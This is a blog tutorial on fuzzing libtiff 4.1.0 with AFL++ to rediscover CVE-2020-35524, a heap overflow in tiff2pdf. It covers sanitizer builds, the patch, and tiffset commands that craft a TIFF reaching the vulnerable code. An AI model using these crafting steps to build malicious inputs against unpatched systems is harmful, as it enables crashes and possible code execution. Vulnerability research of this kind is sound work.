# Finding Vulnerability leading to CVE-2020-35524 in libtiff v4.1.0

In this blog we will see how to set up the fuzzer for `libtiff` and find the heap-based buffer overflow that is registered as CVE-2020-35524. 

**NOTE:** This is not a workshop on AFL++ and skips over a few concepts without explaining them, such as AFL persistence mode, cmplog, compcov etc. If you want to find the details, there is no better place than the [AFL++ documentation](https://github.com/AFLplusplus/AFLplusplus/tree/stable/docs). The `fuzzing_in_depth.md` document explains almost everything you need to get started.
# Compiling Target

I compile the target with different options, for example, cmplog, compcov, different sanitizers, in order to increase chances of finding bugs and using AFL++ to its fullest.

```bash
cd <libtiffdirectory> && ./autogen.sh && CC=afl-clang-lto CXX=afl-clang-lto++ ./configure --disable-shared

for i in cmplog compcov asan ubsan simple;do cp -r <libtiffdirectory> <libtiff_directory>-$$i;done

make -C <libtiff_directory>-simple -j$(nproc)
make AFL_USE_ASAN=1 -C <libtiff_directory>-asan -j$(nproc)
make AFL_USE_UBSAN=1 -C <libtiff_directory>-ubsan -j$(nproc)
make AFL_USE_ASAN=1 AFL_LLVM_CMPLOG=1 -C <libtiff_directory>-cmplog -j$(nproc)
make AFL_USE_ASAN=1 AFL_LLVM_LAF_ALL=1 -C <libtiff_directory>-compcov -j$(nproc)

// Compiling for coverage

CC=clang-14 CFLAGS="$CFLAGS -fprofile-arcs -ftest-coverage" LFLAGS+="--coverage -lgcov" ./configure --disable-shared
make -C <libtiff_directory>-coverage -j$(nproc)
```

# CVE Description

```text
A heap-based buffer overflow flaw was found in libtiff in the handling of TIFF images in libtiff's TIFF2PDF tool. A specially crafted TIFF file can lead to arbitrary code execution. The highest threat from this vulnerability is to confidentiality, integrity, as well as system availability.
```

# Patch

```c
// 11 additions and 3 deletions

- k = checkMultiply64(TIFFScanlineSize(input), t2p->tiff_length, t2p);
-	if(t2p->tiff_planar==PLANARCONFIG_SEPARATE){
-		k = checkMultiply64(k, t2p->tiff_samplesperpixel, t2p);
	
+ #ifdef JPEG_SUPPORT
+	if(t2p->pdf_compression == T2P_COMPRESS_JPEG
+	   && t2p->tiff_photometric == PHOTOMETRIC_YCBCR) {
+		k = checkMultiply64(TIFFNumberOfStrips(input), TIFFStripSize(input),     + t2p);
+	} else
+ #endif
+	{
+		k = checkMultiply64(TIFFScanlineSize(input), t2p->tiff_length, t2p);
+		if(t2p->tiff_planar==PLANARCONFIG_SEPARATE){
+			k = checkMultiply64(k, t2p->tiff_samplesperpixel, t2p);
+		}
```

# Creating an input that triggers the vulnerable code 

There are a lot conditions in the code `tiff2pdf.c` that need to be dealt with in order to make the input that triggers the vulnerable code.

The first condition is the given below:

```c
// Function -> void t2p_read_tiff_size(T2P* t2p, TIFF* input) in tiff2pdf.c

if(t2p->pdf_transcode == T2P_TRANSCODE_RAW){
	#ifdef CCITT_SUPPORT
		return;
	#endif
	
	#ifdef ZIP_SUPPORT
		return;
	#endif
	
	#ifdef OJPEG_SUPPORT
		return;
	#endif
	
	#ifdef JPEG_SUPPORT
		return;
	#endif
}
```

There are 2 methods to deal with this:
1. We can give the compression schemes other than the ones above, as they return from the function and we do not want that. It is because the vulnerable code comes after the `if` condition. 
2. We can give the compression scheme as `None`. It will pass the condition, and also the input `TIFF` file will contain raw uncompressed bytes, that will make analysis easier.
We will choose option 2 as it will make our lives easier later on. 

Now, lets make a TIFF file using `imagemagick` and then change its properties. We also need to set bits/sample to 8.

```bash
convert -depth 8 -size 100x100 xc:white -compress None sample.tif
```

Run `./tiffinfo` on `sample.tif` and we get:

```bash
TIFF Directory at offset 0x132 (306)
  Image Width: 100 Image Length: 100
  Bits/Sample: 8
  Compression Scheme: None
  Photometric Interpretation: min-is-black
  FillOrder: msb-to-lsb
  Orientation: row 0 top, col 0 lhs
  Samples/Pixel: 1
  Rows/Strip: 100
  Planar Configuration: single image plane
  Page Number: 0-1
  White Point: 0.3127-0.329
  PrimaryChromaticities: 0.640000,0.330000,0.300000,0.600000,0.150000,0.060000
  Predictor: horizontal differencing 2 (0x2)
```

This image will not let anything execute in body of `if` condition. 

Next we have the statement:

```c
k = checkMultiply64(TIFFScanlineSize(input), t2p->tiff_length, t2p);
```

We analyze the `TIFFScanlineSize` function which is in `tif_strip.c`.

`TIFFScanlineSize` in turn calls `TIFFScanlineSize64`. There are few checks that we need to pass.

```c
if (td->td_planarconfig==PLANARCONFIG_CONTIG)
{
	if ((td->td_photometric==PHOTOMETRIC_YCBCR)&&
		(td->td_samplesperpixel==3)&&
		(!isUpSampled(tif)))
		{

```

We set the samples per pixel to 3. 

```bash
tiffset -s 277 3 sample.tif
```

Right now we have `Photometric Interpretation: min-is-black`. we need to set it to YCBCR. 

```bash
tiffset -s 262 6 sample.tif
```

Finally, we have a TIFF file that will trigger the vulnerable code

```bash
TIFF Directory at offset 0x1f8 (504)
  Image Width: 50 Image Length: 50
  Bits/Sample: 8
  Compression Scheme: None
  Photometric Interpretation: YCbCr
  FillOrder: msb-to-lsb
  Orientation: row 0 top, col 0 lhs
  Samples/Pixel: 3
  Rows/Strip: 50
  Planar Configuration: single image plane
  Page Number: 0-1
  White Point: 0.3127-0.329
  PrimaryChromaticities: 0.640000,0.330000,0.300000,0.600000,0.150000,0.060000
  Predictor: horizontal differencing 2 (0x2)
```

This one input is enough for our input corpus and let's run the fuzzer and find the crash. 
Before that, we also need to set `pdf_compression` to `JPEG` using the `-j` option.

We get all this information, from reading the merge_requests, after this vulnerability was disclosed. Links are given below.

[Merge Request](https://gitlab.com/libtiff/libtiff/-/merge_requests/159)
[Commit](https://gitlab.com/rzkn/libtiff/-/commit/7be2e452ddcf6d7abca88f41d3761e6edab72b22)

Basically, this vulnerability is triggered when we use `photometric_compression: YCbCr` and use the `pdf_compression: JPEG`. With these options `checkMultiply64(TIFFScanlineSize(input), t2p->tiff_length, t2p);` returns a wrong size, causing a heap-based buffer overflow.

# Dictionary

We can find dictionary for TIFF format in `dictionaries` directory of [AFL++ source code](https://github.com/AFLplusplus/AFLplusplus).

# Fuzzer Commands

```bash
gnome-terminal --window -- bash -c "afl-fuzz -i $(input) -o $(out_afl) -m none -x $(dict) -M main -- ./$(target_name)-simple/$(executable) @@ -j -o /dev/null"

gnome-terminal --window -- bash -c "afl-fuzz -i $(input) -o $(out_afl) -m none -x $(dict) -S asan -- ./$(target_name)-asan/$(executable) @@ -j -o /dev/null"
```

# Crash

After only a few seconds of running the fuzzer we get a crash:

```bash
Command: ./tiff2pdf -j <crashing_input>

# Conclusion

An there we have it! Sometimes the only thing you need to find the vulnerability is to reach the code and it will causes crashes in a matter of seconds. That is why it is so much important to get maximum code coverage while fuzzing. Some bugs are there to be found, you just have to reach them. 

Hope y'all learned something. For feedback email me at `faranabdulla@gmail.com`
